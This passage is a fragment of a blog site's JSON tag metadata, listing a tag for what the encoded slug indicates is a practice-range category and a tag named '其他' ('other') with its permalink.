tags/%E9%9D%B6%E5%9C%BA/"},{"name":"其他","slug":"其他","permalink":"https://qidian-png.github.io/tags/%E5%85%B6%E4%BB%96/"}]}